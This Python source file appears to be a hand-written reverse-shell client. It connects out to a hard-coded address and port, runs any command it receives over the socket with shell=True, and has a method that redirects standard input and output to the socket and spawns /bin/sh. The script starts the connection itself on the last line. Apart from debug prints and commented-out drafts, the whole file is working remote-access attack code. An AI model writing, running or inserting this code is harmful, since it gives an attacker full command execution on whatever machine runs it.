import socket
import subprocess
import json
import select
import pty
import os

BUFFER_SIZE = 4096
MESSAGE = 'echo Hola, mundo!'


class Session():
    def __init__(self, ip, port, buffer_size=2048):
        self.port = port
        self.ip = ip
        self.buf_size = buffer_size
        self.address = (self.ip, self.port)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected = True

    def parse_cmd(self):
        self.cmd = (b''.join(self.chunks)).decode('utf-8')
        print(self.cmd)
        INTERNAL = ["exit", "}whoami", "}sessionid", "}shell"]
        if self.cmd in INTERNAL:
            return True
        return False

    def handle_io(self):
        # self.socket.setblocking(False)
        # while True:
        #     rs, ws, _ = select.select([self.socket], [self.socket], [])
        #     if rs:
        #         self.recv_cmd()
        #         if ws:
        #             if self.parse_cmd():
        #                 output = self.exec_internal_cmd()
        #             else:
        #                 output = self.exec_cmd()
                    # self.socket.sendall(output.stdout)
        while True:
            self.recv_cmd()
            if self.parse_cmd():
                print("inernal")
                self.exec_internal_cmd()
            else:
                self.exec_cmd()

    def exec_internal_cmd(self):
        print("InternalCMD")
        if self.cmd == "exit":
            msg = "Bye"
            data = msg.encode()
            self.socket.sendall(data)
            self.socket.close()
        elif self.cmd == "whoami":
            msg = "\033[31m;t4LoN }>->\033[31m;"
            data = msg.encode()
            self.socket.sendall(data)

    def exec_cmd(self):
        print("comando: ", self.cmd)
        subprocess.run(self.cmd, stdout=self.socket.fileno(),
                                stderr=self.socket.fileno(), stdin=self.socket.fileno(),
                                shell=True)

    def recv_cmd(self): 
        self.chunks = []
        while True:
            try:
                self.bytes = self.socket.recv(self.buf_size)
                print("checkpoint")
                self.chunks.append(self.bytes)
                print(self.bytes)
                if len(self.bytes) < self.buf_size:
                    break
            except(BlockingIOError):
                continue


    def reverse_shell(self):
        # subprocess.run(["/bin/sh"], stdin=self.socket.fileno(), stdout=self.socket.fileno(), stderr=self.socket.fileno())
        prev_fd_in = os.dup(0)
        prev_fd_out = os.dup(1)
        prev_fd_err = os.dup(2)
        [os.dup2(self.socket.fileno(),fd) for fd in (0,1,2)]
        pty.spawn("/bin/sh")
        os.dup2(prev_fd_in, 0)
        os.dup2(prev_fd_out, 1)
        os.dup2(prev_fd_err, 2)
        os.close(prev_fd_in)
        os.close(prev_fd_out)
        os.close(prev_fd_err)
        print("finished")
        EOF = "}shell finished EOF{"

        self.socket.sendall(EOF.encode())

    def connect(self): 
        try:
            self.socket.connect(self.address)
            print("connected")
            self.handle_io()
            self.socket.close()

            # while True:
            #     self.chunks = []
            #     try:
            #         self.recv_cmd()
            #         INTERNAL = self.parsecmd()
            #         if INTERNAL:
            #             output = self.exec_internal_cmd()
            #         else:
            #             output = self.exec_cmd()
            #         self.socket.sendall(output.output.encode('utf-8'))

            #     except (BlockingIOError):
            #         if self.chunks:
            #             print(self.chunks)
            #         else:
            #             pass

        except (TimeoutError):
            raise TimeoutError

session = Session("192.168.4.132", 4242)
session.connect()
